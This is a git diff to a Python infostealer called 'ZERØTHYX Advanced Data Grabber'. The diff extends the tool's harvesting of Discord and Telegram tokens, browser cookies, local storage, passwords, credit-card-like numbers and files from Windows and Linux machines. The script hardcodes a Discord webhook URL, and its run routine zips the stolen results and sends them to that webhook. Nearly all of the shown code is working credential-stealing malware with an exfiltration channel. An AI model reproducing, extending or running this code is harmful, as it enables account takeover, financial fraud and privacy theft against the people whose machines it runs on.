@@ -9,10 +9,11 @@ import requests
 import shutil
 import tempfile
 import zipfile
+import struct
 from datetime import datetime
+from pathlib import Path
 import win32crypt
 from Crypto.Cipher import AES
-import argparse
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1400281612800888923/fHNKZfvDpO7d-VjmHUQuEyqumi_20ue2YQQxW_oVrBcxpxxP7Lq_m6V_q2QGOSsqUsC1"
 
@@ -35,7 +36,7 @@ class AdvancedDataGrabber:
             "extracted_files": [],
             "system_data": {}
         }
-        
+    
     def get_system_info(self):
         try:
             import psutil
@@ -71,7 +72,6 @@ class AdvancedDataGrabber:
                 except:
                     pass
             
-            import psutil
             for iface, addrs in psutil.net_if_addrs().items():
                 info["network_info"][iface] = [
                     {
@@ -196,7 +196,7 @@ class AdvancedDataGrabber:
     def find_discord_paths(self):
         paths = {}
         
-        if platform.system() == "win32":
+        if platform.system() == "Windows":
             local = os.getenv('LOCALAPPDATA')
             roaming = os.getenv('APPDATA')
             
@@ -214,7 +214,7 @@ class AdvancedDataGrabber:
                 "RocketChat": os.path.join(local, "Rocket.Chat")
             })
             
-        elif platform.system() == "linux":
+        elif platform.system() == "Linux":
             home = os.path.expanduser("~")
             config = os.path.join(home, ".config")
             
@@ -227,7 +227,7 @@ class AdvancedDataGrabber:
                 "Element": os.path.join(config, "Element")
             })
             
-        elif platform.system() == "darwin":
+        elif platform.system() == "Darwin":
             home = os.path.expanduser("~/Library/Application Support")
             
             paths.update({
@@ -243,7 +243,7 @@ class AdvancedDataGrabber:
     def find_browser_paths(self):
         paths = {}
         
-        if platform.system() == "win32":
+        if platform.system() == "Windows":
             local = os.getenv('LOCALAPPDATA')
             roaming = os.getenv('APPDATA')
             
@@ -257,10 +257,11 @@ class AdvancedDataGrabber:
                 "Chromium": os.path.join(local, "Chromium", "User Data"),
                 "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
                 "Waterfox": os.path.join(roaming, "Waterfox", "Profiles"),
-                "Tor Browser": os.path.join(roaming, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser")
+                "Tor Browser": os.path.join(roaming, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser"),
+                "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data")
             })
             
-        elif platform.system() == "linux":
+        elif platform.system() == "Linux":
             home = os.path.expanduser("~")
             config = os.path.join(home, ".config")
             
@@ -271,10 +272,11 @@ class AdvancedDataGrabber:
                 "Firefox": os.path.join(home, ".mozilla", "firefox"),
                 "Vivaldi": os.path.join(config, "vivaldi"),
                 "Opera": os.path.join(config, "opera"),
-                "Tor Browser": os.path.join(home, ".local/share/torbrowser")
+                "Tor Browser": os.path.join(home, ".local/share/torbrowser"),
+                "Yandex": os.path.join(config, "yandex-browser")
             })
             
-        elif platform.system() == "darwin":
+        elif platform.system() == "Darwin":
             home = os.path.expanduser("~/Library/Application Support")
             
             paths.update({
@@ -283,7 +285,8 @@ class AdvancedDataGrabber:
                 "Firefox": os.path.join(home, "Firefox/Profiles"),
                 "Brave": os.path.join(home, "BraveSoftware/Brave-Browser"),
                 "Opera": os.path.join(home, "com.operasoftware.Opera"),
-                "Vivaldi": os.path.join(home, "Vivaldi")
+                "Vivaldi": os.path.join(home, "Vivaldi"),
+                "Yandex": os.path.join(home, "Yandex/YandexBrowser")
             })
         
         return paths
@@ -359,6 +362,85 @@ class AdvancedDataGrabber:
         
         return list(set(tokens))
     
+    def find_token_paths(self):
+        paths = {}
+        computer_platform = platform.system()
+        
+        if computer_platform == "Windows":
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+            
+            paths = {
+                "Discord": os.path.join(roaming, "Discord"),
+                "Discord Canary": os.path.join(roaming, "discordcanary"),
+                "Discord PTB": os.path.join(roaming, "discordptb"),
+                "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
+                "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
+                "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
+            }
+        
+        elif computer_platform == "Linux":
+            home = os.path.join(os.path.expanduser("~"), ".config")
+            
+            paths = {
+                "Discord": os.path.join(home, "discord"),
+                "Discord Canary": os.path.join(home, "discordcanary"),
+                "Discord PTB": os.path.join(home, "discordptb"),
+                "Google Chrome": os.path.join(home, "google-chrome", "Default"),
+                "Opera": os.path.join(home, "opera"),
+                "Brave": os.path.join(home, "BraveSoftware", "Brave-Browser", "Default"),
+                "Yandex": os.path.join(home, "yandex-browser", "Default")
+            }
+        
+        elif computer_platform == "Darwin":
+            print("MacOS no es compatible por el momento 😥")
+            return {}
+        
+        return paths
+    
+    def find_token_in_path(self, token_path):
+        tokens = []
+        
+        try:
+            local_storage_path = os.path.join(token_path, "Local Storage", "leveldb")
+            
+            if os.path.exists(local_storage_path):
+                for file in os.listdir(local_storage_path):
+                    if file.endswith(".log") or file.endswith(".ldb"):
+                        file_path = os.path.join(local_storage_path, file)
+                        try:
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                            
+                            regex_patterns = [
+                                re.compile(r'mfa\.[\w-]{84}'),
+                                re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
+                            ]
+                            
+                            for regex in regex_patterns:
+                                matches = regex.findall(content)
+                                for match in matches:
+                                    tokens.append(match)
+                        except:
+                            continue
+        except:
+            pass
+        
+        return tokens
+    
+    def discord_token_grabber(self):
+        paths = self.find_token_paths()
+        tokens_dict = {}
+        
+        for platform_name, path in paths.items():
+            if os.path.exists(path):
+                token_list = self.find_token_in_path(path)
+                if token_list:
+                    tokens_dict[platform_name] = token_list
+        
+        return tokens_dict
+    
     def extract_browser_data(self):
         paths = self.find_browser_paths()
         
@@ -380,9 +462,171 @@ class AdvancedDataGrabber:
                     if history:
                         self.results["browser_history"][browser_name] = history
                 
-                local_storage = self.extract_local_storage(browser_name, browser_path)
-                if local_storage:
-                    self.results["local_storage"][browser_name] = local_storage
+                local_storage_data = self.extract_local_storage_comprehensive(browser_name, browser_path)
+                if local_storage_data:
+                    self.results["local_storage"][browser_name] = local_storage_data
+                    
+                    if browser_name.lower().startswith("discord"):
+                        tokens = self.scan_local_storage_for_tokens(browser_path)
+                        if tokens:
+                            self.results["discord_tokens"].setdefault(browser_name, []).extend(tokens)
+    
+    def extract_local_storage_comprehensive(self, browser_name, browser_path):
+        storage_data = {}
+        
+        try:
+            if browser_name.lower() == "firefox":
+                storage_path = self.find_firefox_local_storage(browser_path)
+            else:
+                storage_path = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
+            
+            if storage_path and os.path.exists(storage_path):
+                storage_data = self.parse_leveldb_storage(storage_path)
+        
+        except Exception as e:
+            pass
+        
+        return storage_data
+    
+    def find_firefox_local_storage(self, firefox_path):
+        try:
+            if os.path.exists(firefox_path):
+                for item in os.listdir(firefox_path):
+                    if item.endswith('.default') or item.endswith('.default-release'):
+                        profile_path = os.path.join(firefox_path, item)
+                        storage_path = os.path.join(profile_path, "storage", "default")
+                        if os.path.exists(storage_path):
+                            return storage_path
+        except:
+            pass
+        return None
+    
+    def parse_leveldb_storage(self, storage_path):
+        storage_items = {}
+        
+        try:
+            for file_name in os.listdir(storage_path):
+                if file_name.endswith(('.log', '.ldb')):
+                    file_path = os.path.join(storage_path, file_name)
+                    
+                    with open(file_path, 'rb') as f:
+                        content = f.read().decode('utf-8', errors='ignore')
+                    
+                    patterns = [
+                        # JSON-like patterns
+                        r'([\w\-\.]+)\s*:\s*["\']([^"\'\n\r]+)["\']',
+                        r'([\w\-\.]+)\s*:\s*([\w\-\.]+)',
+                        # URL patterns
+                        r'(https?://[^\s"\']+)',
+                        # Token patterns
+                        r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
+                        r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',
+                        r'(mfa\.[\w-]{84})',
+                        # API keys
+                        r'([a-zA-Z0-9]{32,})',
+                        # Cookies-like data
+                        r'([\w\-\.]+)=([^;\n\r]+)',
+                        # Base64 encoded data
+                        r'([A-Za-z0-9+/=]{20,})',
+                        # Email patterns
+                        r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
+                        # IP addresses
+                        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
+                        # Credit card-like numbers
+                        r'(\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})',
+                        # Phone numbers
+                        r'(\+?\d{1,3}[-\s]?\(?\d{1,4}\)?[-\s]?\d{1,4}[-\s]?\d{1,9})'
+                    ]
+                    
+                    for pattern in patterns:
+                        matches = re.findall(pattern, content)
+                        for match in matches:
+                            if isinstance(match, tuple):
+                                key, value = match
+                                if len(key) > 2 and len(value) > 2:
+                                    storage_items[key] = value
+                            else:
+                                if len(match) > 10:
+                                    storage_items[f"data_{len(storage_items)}"] = match
+                    
+                    if "discord" in file_name.lower() or "discord" in content.lower():
+                        discord_data = self.extract_discord_local_storage(content)
+                        storage_items.update(discord_data)
+        
+        except Exception as e:
+            pass
+        
+        return storage_items
+    
+    def extract_discord_local_storage(self, content):
+        discord_data = {}
+        
+        try:
+            # Buscar tokens específicos de Discord
+            discord_patterns = {
+                "token": r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
+                "id": r'["\']id["\']\s*:\s*["\']([^"\']+)["\']',
+                "username": r'["\']username["\']\s*:\s*["\']([^"\']+)["\']',
+                "email": r'["\']email["\']\s*:\s*["\']([^"\']+)["\']',
+                "avatar": r'["\']avatar["\']\s*:\s*["\']([^"\']+)["\']',
+                "discriminator": r'["\']discriminator["\']\s*:\s*["\']([^"\']+)["\']',
+                "mfa_enabled": r'["\']mfa_enabled["\']\s*:\s*([^,\n\r]+)',
+                "verified": r'["\']verified["\']\s*:\s*([^,\n\r]+)',
+                "locale": r'["\']locale["\']\s*:\s*["\']([^"\']+)["\']',
+                "premium_type": r'["\']premium_type["\']\s*:\s*([^,\n\r]+)',
+                "public_flags": r'["\']public_flags["\']\s*:\s*([^,\n\r]+)',
+                "flags": r'["\']flags["\']\s*:\s*([^,\n\r]+)',
+                "banner": r'["\']banner["\']\s*:\s*["\']([^"\']+)["\']',
+                "accent_color": r'["\']accent_color["\']\s*:\s*([^,\n\r]+)',
+                "banner_color": r'["\']banner_color["\']\s*:\s*["\']([^"\']+)["\']',
+                "theme": r'["\']theme["\']\s*:\s*["\']([^"\']+)["\']',
+                "guild_positions": r'["\']guild_positions["\']\s*:\s*\[([^\]]+)\]',
+                "guild_settings": r'["\']guild_settings["\']\s*:\s*(\{[^\}]+\})',
+                "user_settings": r'["\']user_settings["\']\s*:\s*(\{[^\}]+\})',
+                "relationships": r'["\']relationships["\']\s*:\s*\[([^\]]+)\]',
+                "read_state": r'["\']read_state["\']\s*:\s*(\{[^\}]+\})',
+                "private_channels": r'["\']private_channels["\']\s*:\s*\[([^\]]+)\]'
+            }
+            
+            for key, pattern in discord_patterns.items():
+                matches = re.findall(pattern, content)
+                if matches:
+                    discord_data[f"discord_{key}"] = matches[0] if len(matches[0]) < 1000 else matches[0][:1000]
+        
+        except Exception as e:
+            pass
+        
+        return discord_data
+    
+    def scan_local_storage_for_tokens(self, app_path):
+        tokens = []
+        
+        try:
+            local_storage_path = os.path.join(app_path, "Local Storage", "leveldb")
+            if os.path.exists(local_storage_path):
+                for file in os.listdir(local_storage_path):
+                    if file.endswith(('.log', '.ldb')):
+                        file_path = os.path.join(local_storage_path, file)
+                        with open(file_path, 'rb') as f:
+                            content = f.read().decode('utf-8', errors='ignore')
+                        
+                        token_patterns = [
+                            r'([\w-]{24}\.[\w-]{6}\.[\w-]{27})',  
+                            r'(mfa\.[\w-]{84})',  
+                            r'(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',  
+                            r'([A-Za-z0-9]{64})', 
+                            r'([A-Za-z0-9]{32})',  
+                            r'([A-Za-z0-9_-]{20,})'  
+                        ]
+                        
+                        for pattern in token_patterns:
+                            matches = re.findall(pattern, content)
+                            tokens.extend(matches)
+        
+        except Exception as e:
+            pass
+        
+        return list(set(tokens))
     
     def extract_browser_cookies(self, browser_name, browser_path):
         cookies = []
@@ -544,28 +788,6 @@ class AdvancedDataGrabber:
             pass
         
         return history
-    
-    def extract_local_storage(self, browser_name, browser_path):
-        storage = {}
-        
-        try:
-            local_storage_path = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
-            if os.path.exists(local_storage_path):
-                for file in os.listdir(local_storage_path):
-                    if file.endswith(('.log', '.ldb')):
-                        file_path = os.path.join(local_storage_path, file)
-                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                            content = f.read()
-                        
-                        matches = re.findall(r'([\w\-\.]+)[\"\']?\s*:\s*[\"\']?([^\"\'\n\r]+)[\"\']?', content)
-                        for key, value in matches:
-                            if len(key) > 2 and len(value) > 2:
-                                storage[key] = value[:100]
-        
-        except:
-            pass
-        
-        return storage
     
     def find_firefox_file(self, firefox_path, filename):
         try:
@@ -805,32 +1027,54 @@ class AdvancedDataGrabber:
             pass
     
     def run(self):
+        print("🔍 ZERØTHYX Advanced Data Grabber")
+        print("=" * 50)
+        
         if self.args.discord:
+            print("📱 Extracting Discord/Telegram tokens...")
             self.extract_discord_tokens()
+            
+            print("🔑 Running advanced Discord token grabber...")
+            discord_tokens = self.discord_token_grabber()
+            for app, tokens in discord_tokens.items():
+                if tokens:
+                    self.results["discord_tokens"].setdefault(app, []).extend(tokens)
         
         if self.args.browsers or self.args.cookies or self.args.passwords or self.args.history:
+            print("🌐 Extracting browser data...")
             self.extract_browser_data()
         
         if self.args.credit_cards:
+            print("💳 Extracting credit card information...")
             self.extract_credit_cards()
         
         if self.args.extract_files:
+            print("📁 Extracting files of interest...")
             self.extract_files_of_interest()
         
+        print("✅ Data extraction complete!")
+        
         if self.args.save:
+            print("💾 Saving results...")
             zip_filename = self.save_results()
+            print(f"📦 Results saved to: {zip_filename}")
             
             if self.args.webhook:
+                print("📤 Sending results to webhook...")
                 self.send_to_webhook(zip_filename)
+        
+        summary = self.create_summary()
+        print("\n" + summary)
 
 def install_arp_dependencies():
-    required = ['requests', 'pycryptodome', 'pywin32']
+    required = ['requests', 'pycryptodome', 'pywin32', 'psutil']
     
     for package in required:
         try:
             __import__(package.replace('-', '_'))
         except ImportError:
             import subprocess
+            import sys
             subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
 
 def main():
@@ -869,6 +1113,6 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        pass
+        print("\n⚠️ Operation interrupted by user.")
     except Exception as e:
-        pass
+        print(f"❌ Error: {e}")
